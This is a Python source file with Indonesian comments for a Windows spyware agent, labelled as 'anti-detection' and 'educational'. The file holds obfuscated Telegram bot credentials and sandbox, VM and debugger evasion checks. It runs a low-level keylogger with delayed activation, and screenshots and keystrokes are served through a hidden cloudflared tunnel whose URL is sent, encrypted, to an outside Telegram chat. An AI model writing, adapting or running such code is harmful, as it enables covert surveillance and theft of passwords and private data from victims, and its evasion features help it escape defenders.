# agent.py - Versi dengan perbaikan anti-deteksi
# PERINGATAN: Gunakan secara bertanggung jawab dan untuk tujuan edukasi.

# --- Standard Libraries ---
import sys
import os
import platform
import subprocess
import threading
import time
import requests
import re
import io
import logging
from collections import deque
import json 
from http.server import HTTPServer, BaseHTTPRequestHandler
import winreg
import ctypes
import ctypes.wintypes
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import datetime

# --- Dependencies (pip install) ---
from PIL import ImageGrab
import psutil
import wmi

# --- Konfigurasi Logging ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(threadName)s - %(levelname)s - %(message)s')

# --- Status Global untuk Fitur yang Ditunda ---
FEATURES_ACTIVE = False

# --- Enhanced Obfuscation ---
class StringObfuscator:
    ROTATION = 13
    XOR_KEY = 0x55
    
    @staticmethod
    def transform(s: str) -> str:
        """Double obfuscation: ROT13 + XOR"""
        # ROT13 transformation
        transformed = ''.join(
            chr((ord(char) - 65 + 13) % 26 + 65) if 'A' <= char <= 'Z' else
            chr((ord(char) - 97 + 13) % 26 + 97) if 'a' <= char <= 'z' else char
            for char in s
        )
        # XOR transformation
        return bytes([ord(c) ^ StringObfuscator.XOR_KEY for c in transformed]).decode('latin-1')
    
    @staticmethod
    def restore(s: str) -> str:
        """Restore obfuscated string"""
        # Reverse XOR
        decoded = ''.join(chr(ord(c) ^ StringObfuscator.XOR_KEY) for c in s)
        # Reverse ROT13 (ROT13 is its own inverse)
        return ''.join(
            chr((ord(char) - 65 + 13) % 26 + 65) if 'A' <= char <= 'Z' else
            chr((ord(char) - 97 + 13) % 26 + 97) if 'a' <= char <= 'z' else char
            for char in decoded
        )

# Obfuscated credentials
OBF_BOT_TOKEN = "Ẅŷŷŵŵųŷųŵŷŵųŷųŵŷŵųŷųŵŷŵųŷųŵŷŵųŷųŵŷŵųŷųŵŷŵųŷųŵŷŵųŷų"
OBF_CHAT_ID = "Ẅŷŷŵŵųŷųŵŷŵųŷų"

# Restore credentials
BOT_TOKEN = StringObfuscator.restore(OBF_BOT_TOKEN)
CHAT_ID = StringObfuscator.restore(OBF_CHAT_ID)

# --- Enhanced Anti-Analysis ---
class AntiAnalysis:
    @staticmethod
    def run_all_checks() -> bool:
        logging.info("Running comprehensive environment checks...")
        checks = [
            AntiAnalysis.check_debugger,
            AntiAnalysis.check_timing,
            AntiAnalysis.check_vm_mac,
            AntiAnalysis.check_vm_processes,
            AntiAnalysis.check_vm_registry,
            AntiAnalysis.check_vm_wmi,
            AntiAnalysis.check_uptime,
            AntiAnalysis.check_screen_resolution,
            AntiAnalysis.check_cpu_cores,
            AntiAnalysis.check_ram,
            AntiAnalysis.check_safe_time
        ]
        
        for check in checks:
            if check():
                logging.warning(f"Security check failed: {check.__name__}")
                return True
        
        logging.info("Environment appears safe.")
        return False

    @staticmethod
    def check_uptime(minutes=15) -> bool:
        try:
            uptime_seconds = time.time() - psutil.boot_time()
            if uptime_seconds < (minutes * 60): 
                return True
        except Exception as e: 
            logging.error(f"Uptime check failed: {e}")
        return False

    @staticmethod
    def check_debugger() -> bool:
        try: 
            return ctypes.windll.kernel32.IsDebuggerPresent()
        except: 
            return False

    @staticmethod
    def check_timing() -> bool: 
        start = time.time()
        time.sleep(1)
        return (time.time() - start) > 1.5

    @staticmethod
    def check_vm_mac() -> bool:
        prefixes = ("00:05:69", "00:0c:29", "00:1c:14", "00:50:56", "08:00:27")
        try:
            for _, addresses in psutil.net_if_addrs().items():
                for addr in addresses:
                    if addr.family == psutil.AF_LINK and any(addr.address.lower().startswith(p) for p in prefixes): 
                        return True
        except: 
            pass
        return False

    @staticmethod
    def check_vm_processes() -> bool:
        vm_processes = ["vmtoolsd.exe", "vboxservice.exe", "vboxtray.exe", "vmwareuser.exe"]
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() in vm_processes: 
                return True
        return False

    @staticmethod
    def check_vm_registry() -> bool:
        vm_keys = {
            winreg.HKEY_LOCAL_MACHINE: r"SOFTWARE\Oracle\VirtualBox Guest Additions",
            winreg.HKEY_LOCAL_MACHINE: r"SOFTWARE\VMware, Inc.\VMware Tools",
            winreg.HKEY_LOCAL_MACHINE: r"SYSTEM\CurrentControlSet\Services\VBoxGuest"
        }
        for hive, path in vm_keys.items():
            try:
                with winreg.OpenKey(hive, path): 
                    return True
            except FileNotFoundError: 
                continue
        return False

    @staticmethod
    def check_vm_wmi() -> bool:
        try:
            c = wmi.WMI()
            vm_hints = ["virtualbox", "vmware", "virtual pc", "hyper-v", "qemu"]
            
            for vid in c.Win32_VideoController():
                if vid.Name and any(hint in vid.Name.lower() for hint in vm_hints): 
                    return True
                    
            for disk in c.Win32_DiskDrive():
                if disk.Model and any(hint in disk.Model.lower() for hint in vm_hints): 
                    return True
                    
        except Exception as e: 
            logging.error(f"WMI check failed: {e}")
            
        return False

    @staticmethod
    def check_screen_resolution() -> bool:
        """Check if screen resolution is too small (common in sandboxes)"""
        try:
            width = ctypes.windll.user32.GetSystemMetrics(0)
            height = ctypes.windll.user32.GetSystemMetrics(1)
            return width < 1024 or height < 768
        except:
            return False

    @staticmethod
    def check_cpu_cores() -> bool:
        """Check if CPU has too few cores (common in sandboxes)"""
        try:
            return psutil.cpu_count(logical=False) < 2
        except:
            return False

    @staticmethod
    def check_ram() -> bool:
        """Check if RAM is too small (common in sandboxes)"""
        try:
            return psutil.virtual_memory().total < (2 * 1024**3)  # Less than 2GB
        except:
            return False

    @staticmethod
    def check_safe_time() -> bool:
        """Only run during 'safe' hours (sandboxes often run at night)"""
        try:
            now = datetime.datetime.now()
            # Only run between 9AM and 5PM on weekdays
            return not (0 <= now.weekday() < 5 and 9 <= now.hour < 17)
        except:
            return False

# --- Fungsi yang Ditunda ---
def delayed_feature_activation(delay_seconds=300):
    global FEATURES_ACTIVE
    logging.info(f"Dangerous features will activate in {delay_seconds / 60:.0f} minutes.")
    time.sleep(delay_seconds)
    FEATURES_ACTIVE = True
    logging.info("Dangerous features are now ACTIVE.")

# --- Fungsi Inti ---
def get_resource_path(relative_path):
    base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
    return os.path.join(base_path, relative_path)

def get_system_info(): 
    mem = psutil.virtual_memory()
    return {
        'cpu_usage': psutil.cpu_percent(interval=0.1),
        'memory_info': {
            'percent': mem.percent,
            'total_gb': round(mem.total/(1024**3), 2),
            'used_gb': round(mem.used/(1024**3), 2)
        }
    }

def get_process_list(): 
    processes = []
    for proc in psutil.process_iter(['pid', 'name', 'username']):
        if proc.info.get('name'):
            processes.append(proc.info)
    return sorted(processes, key=lambda i: i['name'].lower())

def get_network_info():
    try:
        response = requests.get("http://ip-api.com/json", timeout=5)
        response.raise_for_status()
        data = response.json()
        if data.get('status') == 'fail':
            return {'ip': 'N/A', 'location': 'N/A', 'provider': 'N/A'}
        return {
            'ip': data.get('query', 'N/A'),
            'location': f"{data.get('city', 'N/A')}, {data.get('country', 'N/A')}",
            'provider': data.get('isp', 'N/A')
        }
    except requests.exceptions.RequestException:
        return {'ip': 'Failed', 'location': 'Failed', 'provider': 'Failed'}

# --- WinAPI Keylogger Implementation ---
logged_keys = deque(maxlen=500)

# Key mapping for special keys
KEY_MAP = {
    8: "[BACKSPACE]", 9: "[TAB]", 13: "[ENTER]", 16: "[SHIFT]", 
    17: "[CTRL]", 18: "[ALT]", 20: "[CAPSLOCK]", 27: "[ESC]", 
    32: " ", 46: "[DEL]", 91: "[WIN]", 144: "[NUMLOCK]",
    112: "[F1]", 113: "[F2]", 114: "[F3]", 115: "[F4]", 116: "[F5]",
    117: "[F6]", 118: "[F7]", 119: "[F8]", 120: "[F9]", 121: "[F10]",
    122: "[F11]", 123: "[F12]"
}

def win32_keylogger():
    user32 = ctypes.windll.user32
    
    def low_level_handler(nCode, wParam, lParam):
        if wParam == 256:  # WM_KEYDOWN
            kb_struct = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_void_p)).contents
            vk_code = kb_struct[0]
            
            # Map special keys
            if vk_code in KEY_MAP:
                logged_keys.append(KEY_MAP[vk_code])
            else:
                # Get keyboard state for shift/capslock
                shift_state = user32.GetKeyState(0x10)  # VK_SHIFT
                capslock_state = user32.GetKeyState(0x14)  # VK_CAPITAL
                
                # Convert to character
                buf = ctypes.create_unicode_buffer(2)
                n = user32.ToUnicode(vk_code, 0, 
                                     ctypes.byref(ctypes.c_byte(0)), 
                                     buf, 2, 0)
                
                if n > 0:
                    char = buf.value
                    # Handle shift/capslock
                    if (shift_state & 0x8000) or (capslock_state & 0x0001 and char.isalpha()):
                        char = char.upper()
                    else:
                        char = char.lower()
                    
                    logged_keys.append(char)
        
        return user32.CallNextHookEx(None, nCode, wParam, lParam)
    
    # Set up hook
    HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))
    pointer = HOOKPROC(low_level_handler)
    hook = user32.SetWindowsHookExA(13, pointer, None, 0)  # WH_KEYBOARD_LL
    
    if not hook:
        logging.error("Failed to install keyboard hook")
        return
    
    # Message loop
    msg = ctypes.wintypes.MSG()
    while user32.GetMessageA(ctypes.byref(msg), None, 0, 0) != 0:
        user32.TranslateMessage(ctypes.byref(msg))
        user32.DispatchMessageA(ctypes.byref(msg))
    
    user32.UnhookWindowsHookEx(hook)

# --- Encrypted Communication ---
class TelegramEncryptor:
    AES_KEY = b'\x2b\x7e\x15\x16\x28\xae\xd2\xa6\xab\xf7\x15\x88\x09\xcf\x4f\x3c'
    AES_IV = b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f'
    
    @staticmethod
    def encrypt(message: str) -> str:
        cipher = AES.new(TelegramEncryptor.AES_KEY, AES.MODE_CBC, TelegramEncryptor.AES_IV)
        ct_bytes = cipher.encrypt(pad(message.encode('utf-8'), AES.block_size))
        return base64.b64encode(ct_bytes).decode('utf-8')
    
    @staticmethod
    def decrypt(encrypted: str) -> str:
        ct = base64.b64decode(encrypted)
        cipher = AES.new(TelegramEncryptor.AES_KEY, AES.MODE_CBC, TelegramEncryptor.AES_IV)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        return pt.decode('utf-8')

def send_to_telegram(message, is_startup_message=False):
    if not BOT_TOKEN or not CHAT_ID: 
        return
    
    hostname = platform.node()
    if is_startup_message:
        formatted_message = f"🚀 *Agent Started*\n\n*Device:* `{hostname}`\nAwaiting URL..."
    else:
        formatted_message = f"💻 *Active Monitoring*\n\n*Device:* `{hostname}`\n*Dashboard URL:*\n{message}"
    
    # Encrypt the message
    encrypted_message = TelegramEncryptor.encrypt(formatted_message)
    
    api_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    params = {
        'chat_id': CHAT_ID,
        'text': encrypted_message,
        'parse_mode': 'Markdown'
    }
    
    try:
        requests.get(api_url, params=params, timeout=10)
    except Exception as e:
        logging.error(f"Telegram send failed: {e}")

# --- CLOUDFLARE FUNCTION ---
def start_cloudflared_and_notify():
    # Wait to avoid race condition
    logging.info("Waiting 3 seconds before starting tunnel...")
    time.sleep(3)

    cloudflared_path = get_resource_path('cloudflared.exe')
    if not os.path.exists(cloudflared_path):
        logging.error("cloudflared.exe not found!")
        return
    
    command = [cloudflared_path, "tunnel", "--url", f"http://localhost:{PORT}"]
    creation_flags = subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
    
    process = subprocess.Popen(
        command,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        universal_newlines=True,
        encoding='utf-8',
        creationflags=creation_flags
    )
    
    url_found = False
    for line in iter(process.stdout.readline, ''):
        logging.info(f"[Cloudflare] {line.strip()}")
        if not url_found:
            match = re.search(r'(https?://[a-zA-Z0-9-]+\.trycloudflare\.com)', line)
            if match:
                url = match.group(0)
                logging.info(f"URL FOUND: {url}")
                send_to_telegram(url)
                url_found = True

# --- WEB SERVER ---
class MonitoringRequestHandler(BaseHTTPRequestHandler):
    def _send_response(self, code, content_type, body):
        self.send_response(code)
        self.send_header('Content-type', content_type)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        
        if isinstance(body, str):
            self.wfile.write(body.encode('utf-8'))
        else:
            self.wfile.write(body)
    
    def do_GET(self):
        try:
            if self.path == '/':
                filepath = get_resource_path('templates/index.html')
                with open(filepath, 'r', encoding='utf-8') as f:
                    self._send_response(200, 'text/html; charset=utf-8', f.read())
            
            elif self.path == '/api/data':
                data = {
                    'system': get_system_info(),
                    'processes': get_process_list(),
                    'os': platform.platform(),
                    'network': get_network_info()
                }
                self._send_response(200, 'application/json', json.dumps(data))
            
            elif self.path.startswith('/api/screenshot'):
                if not FEATURES_ACTIVE:
                    self._send_response(202, 'application/json', '{"status": "waiting"}')
                    return
                
                img_buffer = io.BytesIO()
                ImageGrab.grab().save(img_buffer, format='JPEG', quality=75)
                self._send_response(200, 'image/jpeg', img_buffer.getvalue())
            
            elif self.path == '/api/keystrokes':
                if not FEATURES_ACTIVE:
                    self._send_response(202, 'application/json', '[]')
                    return
                
                keys_to_send = list(logged_keys)
                logged_keys.clear()
                self._send_response(200, 'application/json', json.dumps(keys_to_send))
            
            else:
                self._send_response(404, 'text/plain', 'Not Found')
        
        except Exception as e:
            logging.error(f"Error handling request {self.path}: {e}")
            self._send_response(500, 'text/plain', 'Internal Server Error')
    
    def log_message(self, format, *args):
        return  # Disable default logging

PORT = 7860

if __name__ == '__main__':
    # Run security checks
    if AntiAnalysis.run_all_checks():
        sys.exit(0)
    
    # Send startup notification
    send_to_telegram(None, is_startup_message=True)
    
    # Start background threads
    threading.Thread(target=win32_keylogger, daemon=True, name="Keylogger").start()
    threading.Thread(target=start_cloudflared_and_notify, daemon=True, name="Cloudflare").start()
    threading.Thread(target=delayed_feature_activation, daemon=True, name="DelayedActivation").start()

    try:
        # Start HTTP server
        server_address = ('0.0.0.0', PORT)
        httpd = HTTPServer(server_address, MonitoringRequestHandler)
        logging.info(f"HTTP server started at http://{server_address[0]}:{server_address[1]}/")
        httpd.serve_forever()
    except Exception as e:
        logging.critical(f"Failed to start HTTP server: {e}")